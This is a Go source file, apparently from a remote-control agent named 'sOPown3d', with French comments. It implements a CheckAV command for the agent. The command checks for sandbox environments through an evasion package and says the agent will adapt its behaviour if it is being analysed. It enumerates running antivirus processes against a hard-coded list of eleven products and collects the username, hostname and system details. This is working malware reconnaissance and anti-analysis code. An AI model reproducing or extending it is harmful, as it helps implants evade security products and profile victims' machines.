//go:build windows
// +build windows

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"sOPown3d/internal/agent/evasion"
	"strings"
)

func CheckAV() string {
	var result strings.Builder

	result.WriteString("\r\n")
	result.WriteString("==========================================\r\n")
	result.WriteString("    ANALYSE ANTIVIRUS ET SANDBOX\r\n")
	result.WriteString("==========================================\r\n")

	// 1. Détection sandbox améliorée
	result.WriteString("\r\n[*] Detection de sandbox...\r\n")
	isSandbox, details := evasion.IsSandbox()
	if isSandbox {
		result.WriteString("[!] ENVIRONNEMENT SANDBOX DETECTE!\r\n")
		result.WriteString(formatOutput(details))
		result.WriteString("    L'agent va adapter son comportement...\r\n")
	} else {
		result.WriteString("[+] Machine normale (pas de sandbox)\r\n")
		result.WriteString(formatOutput(details))
	}

	// 2. Liste des processus AV
	result.WriteString("\r\n[*] Recherche des antivirus:\r\n")
	avProcesses := map[string]string{
		"MsMpEng.exe":  "Windows Defender",
		"avguard.exe":  "Avira",
		"avgui.exe":    "AVG",
		"avastsvc.exe": "Avast",
		"bdagent.exe":  "BitDefender",
		"ccSvcHst.exe": "Norton",
		"ekrn.exe":     "ESET",
		"McShield.exe": "McAfee",
		"V3Svc.exe":    "AhnLab",
		"SophosUI.exe": "Sophos",
		"avp.exe":      "Kaspersky",
	}

	detectedAV := false
	for process, name := range avProcesses {
		cmd := exec.Command("tasklist", "/fi", "imagename eq "+process)
		if output, err := cmd.CombinedOutput(); err == nil {
			outputStr := string(output)
			if !strings.Contains(outputStr, "Aucune tache") &&
				!strings.Contains(outputStr, "No tasks") &&
				strings.Contains(outputStr, process) {
				result.WriteString(fmt.Sprintf("  [!] Detecte: %s (%s)\r\n", name, process))
				detectedAV = true
			}
		}
	}

	if !detectedAV {
		result.WriteString("  [+] Aucun antivirus detecte\r\n")
	}

	// 3. Infos système
	result.WriteString("\r\n[*] INFORMATIONS SYSTEME:\r\n")
	result.WriteString(fmt.Sprintf("  CPU Cores: %d\r\n", runtime.NumCPU()))
	result.WriteString(fmt.Sprintf("  OS: %s\r\n", runtime.GOOS))
	result.WriteString(fmt.Sprintf("  Architecture: %s\r\n", runtime.GOARCH))

	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	result.WriteString(fmt.Sprintf("  Utilisateur: %s\r\n", username))

	hostname, _ := os.Hostname()
	result.WriteString(fmt.Sprintf("  Hostname: %s\r\n", hostname))

	result.WriteString("\r\n[+] Analyse terminee\r\n")
	result.WriteString("==========================================\r\n")

	return result.String()
}

// Fonction helper pour formatter l'output de IsSandbox
func formatOutput(details string) string {
	// Remplace les \n par \r\n pour Windows
	formatted := strings.ReplaceAll(details, "\n", "\r\n")
	// Remplace les emojis si présents
	formatted = strings.ReplaceAll(formatted, "🔍", "[*]")
	formatted = strings.ReplaceAll(formatted, "⚠️", "[!]")
	formatted = strings.ReplaceAll(formatted, "✅", "[+]")
	formatted = strings.ReplaceAll(formatted, "⏳", "[>]")
	return formatted
}
